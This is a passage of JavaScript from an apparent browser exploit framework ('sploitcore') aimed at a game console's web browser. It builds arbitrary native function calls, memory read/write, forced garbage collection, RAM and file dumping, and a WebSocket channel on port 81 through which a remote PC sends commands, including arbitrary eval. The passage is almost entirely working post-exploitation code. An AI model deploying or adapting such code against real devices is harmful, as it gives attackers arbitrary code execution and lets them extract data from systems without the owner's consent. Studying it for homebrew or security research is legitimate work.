	xhr.setRequestHeader('Content-Disposition', '/shareddata.bin');
	xhr.send(int8view);
	xhr = null;*/
	
	ret = CloseDirectory(handle);
	log('CloseDirectory ret=' + ret);
	
	this.free(handle);
	this.free(sFileList);
	this.free(sDirInfo);
}

sploitcore.prototype.bridge = function(ptr, rettype) {
	if(typeof(ptr) == 'number')
		ptr = add2(this.mainaddr, ptr);
	var self = this;
	var args = Array.prototype.slice.call(arguments, [2]);

	var sub = function() {
		if(arguments.length != args.length)
			throw 'Mismatched argument counts';

		var nargs = [];
		for(var i = 0; i < args.length; ++i) {
			var inp = arguments[i], type = args[i], v;
			switch(type) {
				case int: case void_p:
					if(typeof(inp) == 'number')
						v = [inp, 0];
					else
						v = inp;
					break;
				case bool:
					v = [~~inp, 0];
					break;
				case char_p:
					inp = Array.prototype.map.call(inp, function(x) { return x.charCodeAt(0); });
					var len = inp.length + 1;
					if(len % 4 != 0)
						len += 4 - (len % 4);
					v = self.malloc(len);
					for(var j = 0; j < len; j += 4) {
						var a = inp.length > j+0 ? inp[j+0] : 0, b = inp.length > j+1 ? inp[j+1] : 0;
						var c = inp.length > j+2 ? inp[j+2] : 0, d = inp.length > j+3 ? inp[j+3] : 0;
						self.write4((d << 24) | (c << 16) | (b << 8) | a, v, j >> 2);
					}
					break;
			}
			nargs.push(v);
		}

		var retval = self.call(ptr, nargs);

		for(var i = 0; i < args.length; ++i) {
			var na = nargs[i], type = args[i];
			switch(type) {
				case char_p:
					self.free(na);
					break;
			}
		}

		return retval; // XXX: Do type processing
	};

	sub.addr = ptr;

	return sub;
};

sploitcore.prototype.gc = function() {
	dlog('Beginning GC force');
	function sub(depth) {
		dlog('GC force ' + depth);
		if(depth > 0) {
			var arr = [];
			dlog('Building...');
			for(var i = 0; i < 10; ++i)
				arr.push(new Uint8Array(0x40000));
			dlog('Shifting...');
			while(arr.length > 0)
				arr.shift();
			sub(depth - 1);
		}
	}
	sub(20);
	dlog('GC should be solid');
};

sploitcore.prototype.readstring = function (addr, length) {
  if (!length) {
    length = 4
  }

  var out = ''

  var reads = Math.ceil(length / 4)

  for (var i = 0; i < reads; i++) {
    var d = this.read4(addr, i).toString().match(/.{2}/g)
    if (!d) continue
    d.forEach(function (char) {
      if (out.length > length) return
      out += String.fromCharCode(char)
    })
  }

  return out
}

var int = 'int', bool = 'bool', char_p = 'char*', void_p = 'void*';

var bridgedFns = {}

function handler (sc, socket) {
	return function (event) {
		var data = JSON.parse(event.data)

		if (data.cmd === 'sp') {
			log('running getSP()...')
			var sp = sc.getSP()

			socket.send(JSON.stringify({
				type: 'gotsp',
				response: paddr(sc.getSP())
			}))
		} else if (data.cmd === 'call') {
      log('got data:' + JSON.stringify(data))
      var name = data.args.shift()

      log('trying to use saved fn ' + name)

      var fn = bridgedFns[name]

      if (!fn) {
        return log('unknown bridged fn')
      }

      var out = paddr(fn.apply(fn, data.args))

			socket.send(JSON.stringify({
				type: 'call',
				response: out
			}))
		} else if (data.cmd === 'gc') {
      log('running GC')
      sc.gc()
      socket.send(JSON.stringify({
        type: 'gcran'
      }))
    } else if (data.cmd === 'bridge') {
      var name = data.args.shift()

      // Parse addr
      data.args[0] = parseInt(data.args[0])

      var fn = sc.bridge.apply(sc, data.args)

      log('saved fn as ' + name)

      bridgedFns[name] = fn

      socket.send(JSON.stringify({
        type: 'bridged'
      }))
    } else if (data.cmd === 'bridges') {
      socket.send(JSON.stringify({
        type: 'bridges',
        response: Object.keys(bridgedFns)
      }))
    } else if (data.cmd === 'malloc') {
      var size = parseInt(data.args[0])
      var addr = sc.malloc(size)
      socket.send(JSON.stringify({
        type: 'mallocd',
        response: paddr(addr)
      }))
    } else if (data.cmd === 'free') {
      var addr = parseAddr(data.args[0])
      sc.free(addr)
    } else if (data.cmd === 'write4' || data.cmd === 'write8') {
      log(JSON.stringify(data))
      var addr = parseAddr(data.args[0])
      var value = parseInt(data.args[1])
      var offset = parseInt(data.args[2]) || 0

      sc[data.cmd](value, addr, offset)
    } else if (data.cmd === 'read4' || data.cmd === 'read8') {
      var addr = parseAddr(data.args[0])
      var offset = parseInt(data.args[1]) || 0

      var response = sc[data.cmd](addr, offset)

      socket.send(JSON.stringify({
        type: 'rread',
        response: response
      }))
    } else if (data.cmd === 'readstring') {
      var addr = parseAddr(data.args[0])
      var length = parseInt(data.args[1]) || 0

      socket.send(JSON.stringify({
        type: 'rreadstring',
        response: sc.readstring(addr, length)
      }))
    } else if (data.cmd === 'eval' || data.cmd === 'evalfile') {
      var code = data.args.join(' ')
      if (!~code.indexOf('window.response')) {
        if (code.substr(0, 4) !== 'var ') {
          code = 'window.response = ' + code
        }
      }
      window.response = null
      eval('with (sc) { ' + code + '}')
      socket.send(JSON.stringify({
        type: 'evald',
        response: window.response || 'no output'
      }))
    }
	}
}

function setupListener (sc) {
  socket = new WebSocket("ws://" + window.location.hostname + ":81")

  socket.onmessage = handler(sc, socket)

  socket.onopen = function () {
    log('Connected to PC..')
  }
}

function main() {
	var sc = new sploitcore();

  //sc.gc();
  //sc.gc();

  log(paddr(sc.getSP()));

  log(sc.querymem(0));

  var dump_all_ram = false;

  //log(sc.getservicehandle("appletAE"));

  if (dump_all_ram) {
    var addr = [0, 0];
    var last = [0, 0];
    while(true) {
      var mi = sc.querymem(addr);
      last = addr;
      addr = add2(mi[0], mi[1]);
      log(paddr(mi[0]) + ' - ' + paddr(addr) + '  ' + mi[2] + ' ' + mi[3]);
      
      if(mi[3] != 'NONE')
        sc.memdump(mi[0], mi[1][0], 'memdumps/'+paddr(mi[0]) + ' - ' + paddr(addr) + ' - ' + mi[3] + '.bin');
      
      if(addr[1] < last[1]) {
        log('End');
        break;
      }
    }
  }

  // log('Calling sleepthread...');
  // var ret = sc.svc(0xB, [[0x2A05F200, 0x1]], true); // SvcSleepThread(5000000000 ns) = sleep for 5 seconds
  // log('Sleepthread returned ' + paddr(ret));


  //sc.dirlist('shareddata:/');

  //folders
  //sc.dirlist('data:/');
  //sc.dirlist('offline:/'); //crashes
  //sc.dirlist('sd:/'); //crashes
  //sc.dirlist('sdcard:/'); //crashes
  //sc.dirlist('saveuser:/'); //crashes
  //sc.dirlist('savecommon:/'); //crashes
  //sc.dirlist('blacklist:/');
  //sc.dirlist('shareddata:/');
  //sc.dirlist('oceanShared:/');
  //sc.dirlist('oceanShared:/lyt');
  //sc.dirlist('shareddata:/webdatabase');
  //sc.dirlist('shareddata:/browser/emoji');
  //sc.dirlist('shareddata:/browser/page');

  //files
  //sc.dumpFile('oceanShared:/dummy.txt');
  //sc.dumpFile('shareddata:/buildinfo/buildinfo.dat');
  //sc.dumpFile('shareddata:/browser/Skin.dat');
  //sc.dumpFile('shareddata:/browser/MediaControls.css');
  //sc.dumpFile('shareddata:/browser/MediaControls.js');
  //sc.dumpFile('shareddata:/browser/ErrorPageTemplate.html');
  //sc.dumpFile('shareddata:/browser/ErrorPageSubFrameTemplate.html');
  //sc.dumpFile('shareddata:/browser/ErrorPageFilteringTemplate.html');
  //sc.dumpFile('shareddata:/browser/UserCss.dat');
  //sc.dumpFile('shareddata:/browser/RootCaSdk.pem');
  //sc.dumpFile('shareddata:/browser/RootCaEtc.pem');
  //sc.dumpFile('shareddata:/browser/effective_tld_names.dat');
  //sc.dumpFile('shareddata:/.nrr/netfront.nrr');
  //sc.dumpFile('shareddata:/dll/peer_wkc.nro');
  //sc.dumpFile('shareddata:/dll/oss_wkc.nro');
  //sc.dumpFile('shareddata:/dll/cairo_wkc.nro');
  //sc.dumpFile('shareddata:/dll/libfont.nro');
  //sc.dumpFile('shareddata:/dll/webkit_wkc.nro');
  //sc.dumpFile('data:/sound/cruiser.bfsar');

  //var ret = 0x3F99DC;
  //sc.call(ret, [256,257,258,259,260,261,262,263], [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30], true);

  setupListener(sc)
}

setTimeout(function() {
	document.getElementById('test').click();
}, 100);
